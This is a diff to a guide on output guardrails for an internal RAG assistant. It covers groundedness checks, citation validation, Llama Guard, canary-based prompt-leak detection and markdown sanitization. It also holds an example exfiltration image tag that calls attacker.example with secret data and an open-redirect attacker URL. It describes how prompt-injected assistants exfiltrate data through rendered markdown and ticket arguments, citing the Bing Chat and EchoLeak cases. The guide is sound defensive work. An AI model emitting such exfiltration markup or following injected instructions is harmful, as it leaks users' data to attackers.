@@ -54,7 +54,7 @@ flowchart TD
 | PII leakage | Regex + NER, compared to permitted context | Redact | Open with regex fallback | 10–100 ms |
 | Toxicity / profanity | Classifier / moderation API | Regenerate → refuse | Open + flag | 10–100 ms |
 | Policy compliance / brand rules | Classifier or LLM judge | Rewrite / disclaimer / refuse | Open + flag | 10 ms–1 s |
-| Groundedness | NLI model or LLM judge | Remove unsupported claims / regenerate / abstain | Open with disclaimer, or closed for high-stakes | 50 ms–2 s |
+| Groundedness | NLI model or LLM judge | Remove unsupported claims / regenerate once / abstain with sources | **Closed** (synchronous, blocking) for HR, finance, security intents and tool-backed answers; open + flag with a caveat only for read-only, low-risk Q&A | 50 ms–2 s |
 
 ---
 
@@ -70,7 +70,7 @@ flowchart TD
 
 | Option | How it works | Latency/cost | Strengths | Weaknesses |
 |---|---|---|---|---|
-| **Sentence-level NLI** | Split the answer into sentences and score `P(supported given context)` with an NLI model such as Vectara's [HHEM](https://huggingface.co/vectara/hallucination_evaluation_model) (0–1 consistency score) | Low–moderate, self-hostable | Cheap enough for 100% of traffic, provides per-sentence localization | Has context length limits (chunk the premise), weaker on multi-hop reasoning, numbers, and tables |
+| **Sentence-level NLI** | Split the answer into sentences and score `P(supported given context)` with an NLI model such as Vectara's [HHEM](https://huggingface.co/vectara/hallucination_evaluation_model) (0–1 consistency score) | Low–moderate, self-hostable | Cheap enough for 100% of traffic, provides per-sentence localization | HHEM-2.1-Open has no hard context cap, but latency and memory grow with premise length (chunk long premises); English-focused; weaker on multi-hop reasoning, numbers, and tables |
 | **LLM judge, claim decomposition** | Extract atomic claims, then ask a judge whether the context supports each claim (used in RAGAS faithfulness and FActScore) | High | Handles paraphrase, multi-hop reasoning, and tables better | Slow, costly, and non-deterministic. Context can also mislead or inject the judge ([LLM-as-a-judge](../02-offline-evals/07-llm-as-a-judge.md)) |
 | **Hosted groundedness detection** | Call a managed API such as [Azure AI Content Safety groundedness detection](https://learn.microsoft.com/en-us/azure/ai-services/content-safety/concepts/groundedness) | Moderate | Managed service, some APIs offer automatic correction | Data leaves your boundary, behavior is vendor-specific |
 | **Self-consistency (no context)** | Sample several answers and measure agreement ([SelfCheckGPT](https://arxiv.org/abs/2303.08896)) | Very high (N generations) | Works without retrieved context | Measures uncertainty rather than grounding, expensive, rarely fits inline RAG |
@@ -85,7 +85,7 @@ flowchart TD
 | A few non-essential sentences unsupported | **Modify**: drop or hedge those sentences ("I couldn't confirm …") |
 | Key claims unsupported | **Regenerate** once with feedback ("Only use facts present in the context. These statements were unsupported: …") |
 | Still unsupported, or context was insufficient | **Abstain** with sources: "I couldn't find a reliable answer. These documents may help: …" |
-| Groundedness rail errors/timeouts | Fail open **with** a visible caveat for low-stakes intents. Fail closed for high-stakes intents (finance, HR policy, security procedures) |
+| Groundedness rail errors/timeouts | Fail closed for high-stakes intents (HR policy, finance, security procedures) and tool-backed answers: abstain with sources. Fail open **with** a visible caveat and a flag only for read-only, low-risk Q&A ([architecture §5.5](./01-guardrails-architecture.md#55-fail-open-vs-fail-closed)) |
 
 ```python
 import re
@@ -148,7 +148,8 @@ def entail(premise: str, hypothesis: str) -> float:
 ```
 cited          = set of IDs referenced in the answer
 valid          = cited ∩ retrieved_this_turn ∩ permitted
-invalid        = cited − valid                          # fabricated, stale, or forbidden
+forbidden      = cited − permitted                      # not readable by this user, or unknown
+not_retrieved  = (cited ∩ permitted) − retrieved_this_turn   # stale or fabricated
 citation_precision (format) = |valid| / |cited|
 uncited_claims = factual sentences with no citation     # if your policy requires citations
 support check  = entail(chunk_text[id], sentence) for each (sentence, id) pair
@@ -157,34 +158,47 @@ support check  = entail(chunk_text[id], sentence) for each (sentence, id) pair
 ```python
 import re
 
-CITE = re.compile(r"\[(?:doc:)?([A-Za-z0-9_\-:#.]+)\]")
+CITE = re.compile(r"\[doc:([A-Za-z0-9_\-:#.]+)\]")
+# Move markers written after the full stop ("... 30 days. [doc:a]") back before it.
+TRAILING = re.compile(r"([.!?])((?:\s*\[doc:[A-Za-z0-9_\-:#.]+\])+)")
 
 def verify_citations(answer: str, retrieved: dict[str, str], permitted: set[str],
                      require_citations: bool = True) -> dict:
     """retrieved: chunk_id -> text for THIS turn; permitted: chunk IDs the user can read."""
-    sentences = [s for s in re.split(r"(?<=[.!?])\s+", answer) if s.strip()]
-    invalid, uncited, pairs = set(), [], []
+    text = TRAILING.sub(lambda m: m.group(2) + m.group(1), answer)
+    sentences = [s for s in re.split(r"(?<=[.!?])\s+", text) if s.strip()]
+    forbidden, not_retrieved, uncited, pairs = set(), set(), [], []
     for s in sentences:
         ids = CITE.findall(s)
-        if not ids and require_citations and len(s.split()) > 5:
-            uncited.append(s)
+        claim = re.sub(r"\s*" + CITE.pattern, "", s).strip()
+        if not ids and require_citations and len(claim.split()) > 5:
+            uncited.append(claim)
         for cid in ids:
-            if cid not in retrieved or cid not in permitted:
-                invalid.add(cid)
+            if cid not in permitted:
+                forbidden.add(cid)            # forbidden or unknown ID: never echo it to the user
+            elif cid not in retrieved:
+                not_retrieved.add(cid)        # stale (earlier turn) or fabricated
             else:
-                pairs.append((s, cid))      # send to entail(retrieved[cid], s) for support check
-    if any(cid not in permitted for cid in invalid if cid in retrieved):
-        action = "block"                    # cited a non-permitted chunk: treat as leakage incident
-    elif invalid:
-        action = "modify"                   # strip invalid markers, or regenerate if none remain
+                pairs.append((claim, cid))    # send to entail(retrieved[cid], claim)
+    if forbidden:
+        action = "block"       # treat as a leakage incident and alert
+    elif not_retrieved:
+        action = "modify"      # strip these markers; regenerate if no valid citation remains
     elif uncited:
         action = "flag"
     else:
         action = "allow"
-    return {"action": action, "invalid": sorted(invalid), "uncited": uncited, "support_pairs": pairs}
+    return {"action": action, "forbidden": sorted(forbidden), "not_retrieved": sorted(not_retrieved),
+            "uncited": uncited, "support_pairs": pairs}
 ```
 
-**Actions.** Strip invalid citation markers when the rest of the answer is sound. Regenerate the answer if no valid citations remain for key claims. **Block and alert** if a citation points to a non-permitted chunk. That failure indicates a retrieval permission bug ([03 §4](./03-retrieval-and-context-guardrails.md#4-permission-aware-retrieval)), not a model quirk.
+The snippet expects one marker format, `[doc:ID]`. Instruct the model to use it, and treat any other bracket text as plain text. A marker placed after the full stop ("… 30 days. [doc:hr-12]") is moved back into its sentence before the split, so the claim and its citation stay paired.
+
+**Actions.**
+
+- **Block and alert** if a citation names any ID outside the user's permitted set. The snippet also blocks unknown IDs because it cannot tell them apart. If you can look up IDs in the index server-side, treat IDs that do not exist as fabricated (modify) and keep block for IDs that exist but are not permitted. A non-permitted citation indicates a retrieval permission bug ([03 §4](./03-retrieval-and-context-guardrails.md#4-permission-aware-retrieval)) or an extraction attempt, not a model quirk. Never echo the forbidden ID or its title in the refusal.
+- **Modify** when an ID is permitted but was not retrieved in this turn (stale or fabricated). Strip those markers when the rest of the answer is sound. Regenerate if no valid citation remains for key claims.
+- **Check support** for each remaining `(claim, id)` pair with the groundedness `entail` function.
 
 **Rendering tip.** Render citations from **your** metadata (title, URL, last-modified) keyed by the validated ID. Never render citation titles or URLs written by the model.
 
@@ -227,7 +241,16 @@ def classify_entity_provenance(entity: str, user_input: str, contexts: list[str]
 
 **Why.** The assistant speaks with the company's voice. Internal tools must not produce demeaning or discriminatory content. RAG can also surface toxic text verbatim from retrieved tickets or chat logs.
 
-**Detector options.** Use moderation APIs ([OpenAI moderation](https://platform.openai.com/docs/guides/moderation), Azure AI Content Safety), [Detoxify](https://github.com/unitaryai/detoxify), or [Llama Guard](https://arxiv.org/abs/2312.06674). Use profanity wordlists for tone rules. Bias is hard to detect inline, so evaluate it offline with targeted test sets ([generation quality & safety evals](../02-offline-evals/03-generation-quality-and-safety-evals.md)). Use online output rails only for explicit, detectable patterns.
+**Detector options.** Use moderation APIs ([OpenAI moderation](https://developers.openai.com/api/docs/guides/moderation), Azure AI Content Safety), [Detoxify](https://github.com/unitaryai/detoxify), or a Llama Guard model (see below). Use profanity wordlists for tone rules. Bias is hard to detect inline, so evaluate it offline with targeted test sets ([generation quality & safety evals](../02-offline-evals/03-generation-quality-and-safety-evals.md)). Use online output rails only for explicit, detectable patterns.
+
+**Llama Guard versions and taxonomy.** Llama Guard is a family of LLM-based safety classifiers from Meta. It labels a prompt or a response as `safe` or `unsafe` and names the violated categories. Pick a version on purpose:
+
+| Version | Size and input | Categories |
+|---|---|---|
+| [Llama Guard 3](https://huggingface.co/meta-llama/Llama-Guard-3-8B) | 8B and [1B](https://huggingface.co/meta-llama/Llama-Guard-3-1B), text; 8 languages | S1–S14: the 13 hazards of the MLCommons taxonomy plus S14 Code Interpreter Abuse |
+| [Llama Guard 4](https://huggingface.co/meta-llama/Llama-Guard-4-12B) | 12B, text and images (natively multimodal, pruned from Llama 4 Scout); released April 2025 | Same S1–S14 list |
+
+The S1–S14 categories are: Violent Crimes, Non-Violent Crimes, Sex-Related Crimes, Child Sexual Exploitation, Defamation, Specialized Advice, Privacy, Intellectual Property, Indiscriminate Weapons, Hate, Suicide & Self-Harm, Sexual Content, Elections, and Code Interpreter Abuse. You can drop categories or describe your own in the prompt, but re-measure precision and recall after any change. Llama Guard classifies content *safety*. It does not detect prompt injection or check groundedness. For agents, Meta's [LlamaFirewall](https://github.com/meta-llama/PurpleLlama/tree/main/LlamaFirewall) ([paper](https://arxiv.org/abs/2505.03574)) combines Prompt Guard 2 with AlignmentCheck (an LLM monitor of the agent's reasoning) and CodeShield (static analysis of generated code).
 
 **Action.** Set **lower thresholds than on input** because you own what the assistant says. Regenerate once with an instruction to keep a professional tone, and refuse with a template if it fails again. For authorized roles such as HR investigators, allow clearly marked quotes of toxic source material when required.
 
@@ -245,12 +268,12 @@ def classify_entity_provenance(entity: str, user_input: str, contexts: list[str]
 from typing import Literal
 from pydantic import BaseModel, Field, ValidationError, field_validator
 
-ALLOWED_QUEUES = {"IT-HELPDESK", "FACILITIES", "HR-OPS"}
+ALLOWED_QUEUES = {"it", "facilities", "data-platform"}  # matches the create_ticket schema in 05
 
 class TicketDraft(BaseModel):
     queue: str
-    title: str = Field(min_length=5, max_length=120)
-    priority: Literal["P3", "P4"]          # P1/P2 not allowed from the assistant
+    title: str = Field(min_length=5, max_length=200)
+    priority: Literal["low", "medium", "high"] = "medium"
     description: str = Field(max_length=4000)
 
     @field_validator("queue")
@@ -259,6 +282,11 @@ class TicketDraft(BaseModel):
         if v not in ALLOWED_QUEUES:
             raise ValueError(f"queue must be one of {sorted(ALLOWED_QUEUES)}")
         return v
+
+def required_approval(draft: TicketDraft) -> str:
+    """Every ticket gets an inline preview and one-click user confirmation.
+    High priority also pages on-call, so it needs a second approval (e.g., the on-call lead)."""
+    return "user_confirm+oncall_approval" if draft.priority == "high" else "user_confirm"
 
 def parse_with_retry(generate, prompt: str, max_attempts: int = 2) -> TicketDraft | None:
     """generate(prompt) -> str (model output). Returns None to trigger fallback."""
@@ -272,6 +300,8 @@ def parse_with_retry(generate, prompt: str, max_attempts: int = 2) -> TicketDraf
             feedback = f"\n\nYour previous output was invalid: {errors}. Return only valid JSON."
     return None
 ```
+
+**Approval is separate from validation.** A valid draft is not an approved one. `required_approval` maps the validated draft to the approval it needs. Every ticket gets an inline preview and one-click user confirmation, because other staff can read tickets and an injected model could use one to exfiltrate data. High-priority tickets page people, so they also need on-call approval. This follows the canonical tool tiers in [05](./05-tool-and-action-guardrails.md).
 
 **Guardrails AI concept.** [Guardrails AI](https://github.com/guardrails-ai/guardrails) packages this pattern as **validators** with an `on_fail` policy on fields or whole outputs. Its `OnFailAction` enum includes `reask`, `fix`, `filter`, `refrain`, `noop`, `exception`, `fix_reask`, and `custom`. The [Guardrails Hub](https://hub.guardrailsai.com/) distributes reusable validators. This vocabulary maps directly to the actions in this guide: *fix/filter* = modify, *reask* = regenerate, *refrain* = refuse/fallback, *noop* = flag, and *exception* = block.
 
@@ -293,7 +323,7 @@ def parse_with_retry(generate, prompt: str, max_attempts: int = 2) -> TicketDraf
 
 - **Topic classifier** over the question and answer for denied categories.
 - **LLM judge with an explicit rubric** for gray areas: "Does the answer provide individualized legal, medical, or financial advice, or make an HR determination? Return yes/no and the span."
-- **Llama Guard safety taxonomies** for categories such as specialized advice. Verify the taxonomy of the model version you use.
+- **Llama Guard** category S6 *Specialized Advice* (financial, medical, legal) for clear cases ([§5](#5-toxicity-profanity-and-bias)). It does not cover HR determinations or company commitments, so pair it with your own rubric.
 - **Rule-based phrase matching** for unauthorized commitments ("we guarantee", "you are entitled to").
 
 **Actions.**
@@ -310,7 +340,7 @@ def parse_with_retry(generate, prompt: str, max_attempts: int = 2) -> TicketDraf
 
 **What.** Enforce brand and communication rules. Do not recommend competitors, disparage partners, use unapproved product names, break tone guidelines, or mention unreleased products.
 
-**Detector options.** Use deterministic dictionaries for competitor names, aliases, unreleased codenames, and approved terminology. Match with word boundaries, case insensitivity, and fuzzy variants. Add an LLM judge for tone if needed.
+**Detector options.** Use deterministic dictionaries for competitor names, aliases, unreleased codenames, and approved terminology. Match with word boundaries, case insensitivity, and fuzzy variants. Use `(?<!\w)` and `(?!\w)` rather than `\b`, because `\b` never matches after a final non-word character, so terms such as "C++", ".NET", or "AT&T" would never match. Add an LLM judge for tone if needed.
 
 **Actions.** Modify the output by replacing codenames or removing offending sentences, regenerate for tone, or flag for review. For **internal** assistants, competitor mentions are often legitimate in competitive analysis, so scope this rail to external-facing outputs or specific intents. Codename leakage matters whenever content leaves the company, such as generated customer emails.
 
@@ -321,11 +351,12 @@ def term_rule(text: str, terms: dict[str, str | None]) -> tuple[str, list[str]]:
     """terms: term -> replacement (None = flag only). Returns (modified_text, hits)."""
     hits = []
     for term, repl in terms.items():
-        rx = re.compile(rf"\b{re.escape(term)}\b", re.IGNORECASE)
+        # (?<!\w)...(?!\w) instead of \b, so terms such as "C++" or ".NET" still match.
+        rx = re.compile(rf"(?<!\w){re.escape(term)}(?!\w)", re.IGNORECASE)
         if rx.search(text):
             hits.append(term)
             if repl is not None:
-                text = rx.sub(repl, text)
+                text = rx.sub(lambda _: repl, text)
     return text, hits
 
 term_rule("Project Falcon ships with Q3.", {"Project Falcon": "the upcoming release"})
@@ -337,31 +368,39 @@ term_rule("Project Falcon ships with Q3.", {"Project Falcon": "the upcoming rele
 
 **What.** Detect when the output reproduces the system prompt, hidden instructions, tool definitions, internal configuration, or other users' data.
 
-**Why.** Prompt extraction is often the first step of a targeted attack because it reveals tool names, guardrail wording, and internal endpoints. The OWASP Top 10 for LLM Applications lists *System Prompt Leakage* as a distinct risk. **Never put secrets in the system prompt.** Assume the prompt will leak, and detect leakage as an attack signal.
+**Why.** Prompt extraction is often the first step of a targeted attack because it reveals tool names, guardrail wording, and internal endpoints. The OWASP Top 10 for LLM Applications 2026 covers this under *LLM08:2026 Hidden Context Exposure* (broadened from *System Prompt Leakage*; see the mapping in [07](./07-threat-model-owasp.md)). **Never put secrets in the system prompt.** Assume the prompt will leak, and detect leakage as an attack signal.
 
 **Detector options.**
 
-- **Canary token**: embed a random string in the system prompt and rotate it per deployment or session. If the canary appears in outputs or tool arguments, block the response. This check has near-zero false positives.
-- **N-gram or longest-common-substring overlap**: compare the output against the system prompt and tool descriptions. Flag outputs with more than a 20-token overlap or 30% of distinctive system-prompt n-grams.
+- **Canary token**: embed a random string in the system prompt and rotate it per deployment or session. If the canary appears in outputs or tool arguments, block the response. This check has near-zero false positives but low recall: it catches verbatim or lightly reformatted copies (the snippet also compares a squashed form without spaces and punctuation). It misses paraphrase, translation, and encoded copies such as Base64.
+- **N-gram or longest-common-substring overlap**: compare the output against the system prompt and tool descriptions. The snippet blocks when more than 10% of the system prompt's word 8-grams appear in the output. This is a heuristic starting point; calibrate it on your own prompts and benign answers.
 - **Embedding similarity**: compare output embeddings to the system prompt to catch paraphrased leakage (noisier).
 
 ```python
+import re
 import secrets
+import unicodedata
 
 CANARY = f"cnry-{secrets.token_hex(8)}"
 SYSTEM_PROMPT = f"""You are Acme's internal assistant. [{CANARY}] ..."""
 
+def _squash(text: str) -> str:
+    """Lowercase, NFKC, and drop everything except letters and digits."""
+    return re.sub(r"[\W_]+", "", unicodedata.normalize("NFKC", text).lower())
+
 def ngrams(text: str, n: int = 8) -> set[tuple[str, ...]]:
-    toks = text.lower().split()
+    toks = re.findall(r"\w+", text.lower())
     return {tuple(toks[i:i + n]) for i in range(len(toks) - n + 1)}
 
 def prompt_leak(output: str, system_prompt: str = SYSTEM_PROMPT, n: int = 8,
                 max_overlap: float = 0.1) -> dict:
-    if CANARY in output:
+    # Canaries catch verbatim or lightly reformatted copies only, not paraphrase,
+    # translation, or encoded leaks.
+    if CANARY in output or _squash(CANARY) in _squash(output):
         return {"action": "block", "reason": "canary"}
     sp = ngrams(system_prompt, n)
     overlap = len(sp & ngrams(output, n)) / max(len(sp), 1)
-    return {"action": "block" if overlap > max_overlap else "allow", "overlap": overlap}
+    return {"action": "block" if overlap > max_overlap else "allow", "overlap": round(overlap, 3)}
 ```
 
 **Action.** Block the response, return a generic message, and flag the session for security review. Run the canary check on **tool arguments** too, because an injected agent can exfiltrate instructions via `create_ticket(description=…)`.
@@ -382,33 +421,70 @@ When the assistant *displays* SQL or code to the user, check it before rendering
 
 If your UI renders markdown, an image tag like `![x](https://attacker.example/log?d=<secret data>)` makes the **user's browser** send data to the attacker on load. No click is needed. When combined with indirect prompt injection ([03 §5](./03-retrieval-and-context-guardrails.md#5-indirect-prompt-injection-in-retrieved-content)), this pattern exfiltrates data from LLM chat products. Markdown links (`[click here](…)`) are the click-required variant.
 
+This is a real attack class. Johann Rehberger showed it against [Bing Chat](https://embracethered.com/blog/posts/2023/bing-chat-data-exfiltration-poc-and-fix/) and other chat products. In 2025 *EchoLeak* ([CVE-2025-32711](https://nvd.nist.gov/vuln/detail/CVE-2025-32711), "AI command injection in M365 Copilot") reportedly used reference-style markdown to get past link redaction.
+
 Apply these guardrails:
 
-- **Block images from arbitrary URLs.** Allowlist trusted image domains (such as your CDN), or disable model-generated images completely.
-- **Allowlist link domains.** Rewrite or strip other links so the UI displays the URL as plain text.
-- **Sanitize or disable raw HTML** in the markdown renderer to prevent XSS (*Improper Output Handling* in OWASP).
-- **Strip query strings** from links to non-allowlisted domains if you choose to display them.
+- **Sanitize with the same parser that renders.** Regexes over markdown miss reference-style links (`![x][1]` with `[1]: https://…` later), autolinks, nested brackets, and HTML. Parse the answer with your renderer's parser, edit the token tree, and render from it, as the snippet below does.
+- **Block images from arbitrary URLs.** Keep a separate, small image allowlist (such as your CDN), or disable model-generated images completely. Better still, serve images through your own image proxy that fetches only allowlisted sources.
+- **Allowlist link domains.** Rewrite or strip other links so the UI displays only the label text.
+- **Watch for open redirects.** An allowlisted domain with a redirect endpoint (`https://docs.acme.com/out?to=https://attacker…`) defeats a domain allowlist. The snippet rejects URLs that embed another URL; also fix the redirect endpoints.
+- **Sanitize or disable raw HTML** in the renderer to prevent XSS (*LLM10:2026 Improper Output Handling*). If you must render HTML, sanitize it with an allowlist sanitizer such as [nh3](https://github.com/messense/nh3) (Python) or [DOMPurify](https://github.com/cure53/DOMPurify) (browser).
+- **Add a Content Security Policy as a backstop.** Restrict `img-src` and `connect-src` to your own origins so the browser refuses to load an attacker URL even if the sanitizer misses it ([OWASP CSP Cheat Sheet](https://cheatsheetseries.owasp.org/cheatsheets/Content_Security_Policy_Cheat_Sheet.html)).
 
 ```python
 import re
-from urllib.parse import urlparse
+from urllib.parse import unquote, urlparse
 
-ALLOWED_LINK_DOMAINS = {"wiki.acme.internal", "docs.acme.com"}
-MD_IMAGE = re.compile(r"!\[([^\]]*)\]\(([^)\s]+)[^)]*\)")
-MD_LINK = re.compile(r"(?<!!)\[([^\]]+)\]\(([^)\s]+)[^)]*\)")
+from markdown_it import MarkdownIt
+from markdown_it.token import Token
 
-def _allowed(url: str) -> bool:
-    host = (urlparse(url).hostname or "").lower()
-    return urlparse(url).scheme == "https" and any(
-        host == d or host.endswith("." + d) for d in ALLOWED_LINK_DOMAINS)
+IMAGE_DOMAINS = {"cdn.acme.com"}                 # images: your CDN only
+LINK_DOMAINS = {"docs.acme.com", "wiki.acme.com"}
+EMBEDDED_URL = re.compile(r"(?i)(?:https?:|//|\\\\)")   # open-redirect style ?to=https://...
 
-def sanitize_markdown(md: str) -> str:
-    md = MD_IMAGE.sub(lambda m: m.group(0) if _allowed(m.group(2)) else f"[image removed: {m.group(1)}]", md)
-    md = MD_LINK.sub(lambda m: m.group(0) if _allowed(m.group(2)) else m.group(1), md)
-    return md
+# Parse with the SAME parser and options that render the answer. Raw HTML off, linkify off.
+md = MarkdownIt("commonmark", {"html": False, "linkify": False})
+
+def _allowed(url: str, domains: set[str]) -> bool:
+    try:
+        p = urlparse(url)
+    except ValueError:
+        return False
+    host = (p.hostname or "").lower().rstrip(".")
+    if p.scheme != "https" or p.username or p.password or p.port not in (None, 443):
+        return False
+    if not any(host == d or host.endswith("." + d) for d in domains):
+        return False
+    return not EMBEDDED_URL.search(unquote(unquote(p.path + "?" + p.query)))
+
+def _sanitize_inline(children: list[Token]) -> list[Token]:
+    out, skip_close = [], 0
+    for tok in children:
+        if tok.type == "image" and not _allowed(tok.attrGet("src") or "", IMAGE_DOMAINS):
+            text = Token("text", "", 0)
+            text.content = f"[image removed: {tok.content}]"
+            out.append(text)
+        elif tok.type == "link_open" and not _allowed(tok.attrGet("href") or "", LINK_DOMAINS):
+            skip_close += 1              # drop the link, keep its label text
+        elif tok.type == "link_close" and skip_close:
+            skip_close -= 1
+        else:
+            out.append(tok)
+    return out
+
+def sanitize_markdown(text: str) -> str:
+    """Return safe HTML. Reference-style links, autolinks, and nested brackets are all
+    resolved by the parser, so they cannot slip past a regex."""
+    env: dict = {}
+    tokens = md.parse(text, env)
+    for tok in tokens:
+        if tok.type == "inline" and tok.children:
+            tok.children = _sanitize_inline(tok.children)
+    return md.renderer.render(tokens, md.options, env)
 ```
 
-Disable raw HTML and bare-URL autolinking in the renderer, or apply the same domain allowlist to them.
+The snippet uses [markdown-it-py](https://github.com/executablebooks/markdown-it-py) with raw HTML and linkify off. It is illustrative: use it behind the CSP backstop, and test it with your own renderer's options, because a different parser or plugin set can create links the sanitizer never sees.
 
 ---
 
@@ -420,7 +496,7 @@ Streaming makes answers feel fast, but users can see content before whole-answer
 |---|---|---|
 | Secrets / canary / system prompt leakage | Yes (pattern-local) | Check chunks with a hold-back window ≥ longest pattern. **Never** stream optimistically |
 | PII redaction | Mostly (entity-local) | Check chunks with a sentence-sized hold-back window |
-| Markdown/link sanitization | Yes, once the link closes | Hold back tokens from `[` or `![` until `)` arrives |
+| Markdown/link sanitization | Partly | A reference-style link can be defined at the end of the answer, so a per-chunk check is not enough. Re-parse the whole buffer on each release and send only sanitized, rendered output; or buffer any answer that contains `[` or `<` |
 | Toxicity / profanity | Mostly | Check sentence-level chunks |
 | Citation verification | Per citation marker | Validate each marker as it completes, and render citations at the end from your metadata |
 | Schema validation | No | Do not stream structured outputs to code. Stream only to human interfaces |
@@ -474,14 +550,14 @@ Evaluate output guardrails with the same metrics as other rails ([architecture �
 
 - [ ] Order output rails from structure to cheap deterministic checks, classifiers, and groundedness.
 - [ ] Run independent output classifiers in parallel.
-- [ ] Run a groundedness gate on high-stakes intents with thresholds calibrated on labeled domain data.
+- [ ] Run a synchronous, fail-closed groundedness gate on high-stakes intents with thresholds calibrated on labeled domain data; regenerate once, then abstain with sources.
 - [ ] Verify numbers in data answers programmatically against SQL results.
-- [ ] Validate citations against this turn's retrieved and permitted IDs, and render citations from your own metadata.
+- [ ] Validate `[doc:ID]` citations against this turn's retrieved and permitted IDs, block any non-permitted ID, and render citations from your own metadata.
 - [ ] Redact PII and secrets in outputs, and redact entities with unexplained provenance by default.
 - [ ] Check outputs and tool arguments for canary tokens and n-gram overlap, and keep secrets out of system prompts.
 - [ ] Validate structured outputs for schema, semantics, and entitlements with at most 1–2 re-asks before fallback.
 - [ ] Scope regulated-advice and brand rules to relevant intents and audiences using templated disclaimers.
-- [ ] Restrict markdown images and links to allowlisted domains, and disable or sanitize raw HTML.
+- [ ] Sanitize markdown on the parsed token tree, keep separate image and link allowlists, reject open-redirect URLs, disable or sanitize raw HTML, and set a CSP `img-src` / `connect-src` backstop.
 - [ ] Choose a streaming strategy per rail and per intent, and never run leakage rails optimistically.
 - [ ] Define, bound, and monitor the regenerate, fallback, and refuse policy.
 
@@ -494,7 +570,7 @@ Evaluate output guardrails with the same metrics as other rails ([architecture �
 - **Prefer local repair over regeneration, and bounded regeneration over refusal.** Always provide a safe fallback such as a sources-only response.
 - **Enforce semantic rules and entitlements in code.** Schema validity alone is insufficient, and models must never repair authorization fields.
 - **Assume the system prompt will leak.** Keep secrets out of prompts, and detect leaks with canaries and overlap checks across outputs and tool arguments.
-- **Treat rendered markdown as an exfiltration channel.** Allowlist image and link domains and sanitize HTML.
+- **Treat rendered markdown as an exfiltration channel.** Sanitize the parsed token tree, allowlist image and link domains, and add a CSP backstop.
 - **Set a streaming strategy per rail.** Run leakage checks before displaying tokens to the user.
 
 ## Further reading
@@ -505,10 +581,11 @@ Evaluate output guardrails with the same metrics as other rails ([architecture �
 - Es et al., [RAGAS: Automated Evaluation of Retrieval Augmented Generation](https://arxiv.org/abs/2309.15217)
 - Microsoft, [Groundedness detection in Azure AI Content Safety](https://learn.microsoft.com/en-us/azure/ai-services/content-safety/concepts/groundedness)
 - [Guardrails AI](https://github.com/guardrails-ai/guardrails) · [Guardrails Hub](https://hub.guardrailsai.com/) · [Pydantic](https://docs.pydantic.dev/latest/) · [JSON Schema](https://json-schema.org/)
-- Inan et al., [Llama Guard: LLM-based Input-Output Safeguard for Human-AI Conversations](https://arxiv.org/abs/2312.06674)
-- Anthropic, [Reduce hallucinations](https://docs.anthropic.com/en/docs/test-and-evaluate/strengthen-guardrails/reduce-hallucinations)
-- OWASP, [Top 10 for LLM Applications](https://genai.owasp.org/llm-top-10/) (Improper Output Handling, Sensitive Information Disclosure, System Prompt Leakage)
-- NVIDIA, [NeMo Guardrails documentation](https://docs.nvidia.com/nemo/guardrails/latest/index.html) (output and streaming rails)
+- Inan et al., [Llama Guard: LLM-based Input-Output Safeguard for Human-AI Conversations](https://arxiv.org/abs/2312.06674) · [Llama Guard 4 model card](https://huggingface.co/meta-llama/Llama-Guard-4-12B) · [LlamaFirewall](https://arxiv.org/abs/2505.03574)
+- Anthropic, [Reduce hallucinations](https://platform.claude.com/docs/en/test-and-evaluate/strengthen-guardrails/reduce-hallucinations)
+- OWASP, [Top 10 for LLM Applications 2026](https://genai.owasp.org/resource/owasp-genai-llm-top-10-2026/) (LLM02:2026 Sensitive Information Disclosure, LLM08:2026 Hidden Context Exposure, LLM10:2026 Improper Output Handling) · [Content Security Policy Cheat Sheet](https://cheatsheetseries.owasp.org/cheatsheets/Content_Security_Policy_Cheat_Sheet.html)
+- Rehberger, [Bing Chat: Data Exfiltration Exploit Explained](https://embracethered.com/blog/posts/2023/bing-chat-data-exfiltration-poc-and-fix/) · NVD, [CVE-2025-32711 (EchoLeak)](https://nvd.nist.gov/vuln/detail/CVE-2025-32711)
+- NVIDIA, [NeMo Guardrails documentation](https://docs.nvidia.com/nemo/guardrails/about-nemo-guardrails-library/overview) (output and streaming rails)
 - **In this repo:**
     - [End-to-end RAG evals](../02-offline-evals/01-end-to-end-rag-evals.md)
     - [Instruction & citation adherence](../02-offline-evals/06-instruction-and-citation-adherence.md)
